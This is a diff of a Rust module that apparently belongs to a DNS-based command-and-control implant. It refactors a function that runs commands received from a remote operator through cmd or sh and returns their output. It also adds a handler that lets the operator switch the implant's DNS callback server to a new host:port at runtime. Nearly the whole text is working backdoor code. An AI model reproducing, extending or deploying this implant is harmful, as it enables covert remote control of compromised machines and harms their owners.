@@ -2,6 +2,8 @@ use crate::request;
 use crate::crypto;
 use std::process::Command;
 use crate::SLEEP;
+use crate::DNS_SERVER;
+
 
 
 // Parse and execute the provided command and return the output
@@ -9,7 +11,7 @@ pub fn execute(cmd: String) -> String {
     let to_return: String;
 
     let output = if cfg!(target_os = "windows") {
-        Command::new("cmd")
+        Command::new("cmd")                                 //This can also be powershell
             .args(["/C", cmd.replace("\0", "").trim()])
             .output()
             .expect("failed to execute process")
@@ -22,16 +24,28 @@ pub fn execute(cmd: String) -> String {
     };    
 
     // Return the output or the error if any
-    if output.stdout.is_empty() && !output.stderr.is_empty() {
-        to_return = String::from_utf8(output.stderr).unwrap();
-    } else if output.stderr.is_empty() && !output.stdout.is_empty() {
-        to_return = String::from_utf8(output.stdout).unwrap();
-    } else {
-        //Maybe useless... fallback for commands that have no output
-        to_return = "No output for this command".to_string();
-    }
+    let to_return = match (output.stdout.is_empty(), output.stderr.is_empty()) {
+        (false, true) => String::from_utf8(output.stdout).unwrap(),
+        (true, false) => String::from_utf8(output.stderr).unwrap(),
+        _ => "No output for this command".to_string(),
+    };
 
     return to_return;
+}
+
+
+// Reconfigure the DNS Server address if "reconfigure_dnsserver host:port" is received
+pub fn reconfigure_dnsserver(cmd: String) {
+    let mut parts: Vec<String> = cmd.split_whitespace().map(|part| part.to_owned()).collect();
+    match parts.pop() {
+        Some(addr) => {
+            unsafe {
+                let new: String = addr.trim_matches('\0').to_string();
+                DNS_SERVER = new;
+            }
+        },
+        None => {}
+    };
 }
 
 
